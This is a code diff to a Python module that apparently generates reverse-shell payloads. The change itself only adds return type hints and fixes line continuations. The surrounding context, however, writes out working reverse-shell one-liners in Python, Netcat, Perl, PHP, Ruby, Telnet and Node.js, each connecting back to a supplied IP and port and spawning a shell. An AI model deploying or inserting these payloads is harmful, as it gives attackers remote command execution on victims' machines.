@@ -2,7 +2,7 @@ from .encoded import Encode
 
 
 class Bash(Encode):
-    def __init__(self: object, ip: str, porta: str):
+    def __init__(self: object, ip: str, porta: str) -> None:
         self.__ip = ip
         self.__porta = porta
         self.__payload = (
@@ -12,7 +12,7 @@ class Bash(Encode):
 
 
 class Python(Encode):
-    def __init__(self: object, ip: str, porta: str):
+    def __init__(self: object, ip: str, porta: str) -> None:
         self.__ip = ip
         self.__porta = porta
         self.__payload = f'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{self.__ip}",{self.__porta}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")\''
@@ -20,7 +20,7 @@ class Python(Encode):
 
 
 class Powershell(Encode):
-    def __init__(self: object, ip: str, porta: str):
+    def __init__(self: object, ip: str, porta: str) -> None:
         self.__ip = ip
         self.__porta = porta
         self.__payload = (
@@ -34,7 +34,7 @@ class Powershell(Encode):
 
 
 class Netcat(Encode):
-    def __init__(self: object, ip: str, porta: str):
+    def __init__(self: object, ip: str, porta: str) -> None:
         self.__ip = ip
         self.__porta = porta
         self.__payload = f'nc -vn {self.__ip} {self.__porta} -e "/bin/bash"'
@@ -42,19 +42,19 @@ class Netcat(Encode):
 
 
 class Perl(Encode):
-    def __init__(self: object, ip: str, porta: str):
+    def __init__(self: object, ip: str, porta: str) -> None:
         self.__ip = ip
         self.__porta = porta
-        self.__payload = 'perl -e \'use Socket;$i="$ENV{'
-        +self.__ip
-        +'}"+";$p=$ENV{'
-        +self.__porta
+        self.__payload = 'perl -e \'use Socket;$i="$ENV{' \
+        +self.__ip \
+        +'}"+";$p=$ENV{' \
+        +self.__porta \
         +'};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
         super().__init__(self.__payload)
 
 
 class PHP(Encode):
-    def __init__(self: object, ip: str, porta: str):
+    def __init__(self: object, ip: str, porta: str) -> None:
         self.__ip = ip
         self.__porta = porta
         self.__payload = f'php -r \'$sock=fsockopen(getenv({self.__ip}),getenv({self.__porta}));exec("/bin/sh -i <&3 >&3 2>&3");\''
@@ -62,7 +62,7 @@ class PHP(Encode):
 
 
 class Ruby(Encode):
-    def __init__(self: object, ip: str, porta: str):
+    def __init__(self: object, ip: str, porta: str) -> None:
         self.__ip = ip
         self.__porta = porta
         self.__payload = f'ruby -rsocket -e\'spawn("sh",[:in,:out,:err]=>TCPSocket.new("{self.__ip}",{self.__porta}))\''
@@ -70,7 +70,7 @@ class Ruby(Encode):
 
 
 class Telnet(Encode):
-    def __init__(self: object, ip: str, porta: str):
+    def __init__(self: object, ip: str, porta: str) -> None:
         self.__ip = ip
         self.__porta = porta
         self.__payload = f'TF=$(mktemp -u);mkfifo $TF && telnet {self.__ip} {self.__porta} 0<$TF | sh 1>$TF'
@@ -78,7 +78,7 @@ class Telnet(Encode):
 
 
 class NodeJs(Encode):
-    def __init__(self: object, ip: str, porta: str):
+    def __init__(self: object, ip: str, porta: str) -> None:
         self.__ip = ip
         self.__porta = porta
         self.__payload = f"require('child_process').execSync('nc -e sh {self.__ip} {self.__porta}')"
@@ -86,7 +86,7 @@ class NodeJs(Encode):
 
 
 class Golang(Encode):
-    def __init__(self: object, ip: str, porta: str):
+    def __init__(self: object, ip: str, porta: str) -> None:
         self.__ip = ip
         self.__porta = porta
         self.__payload = (
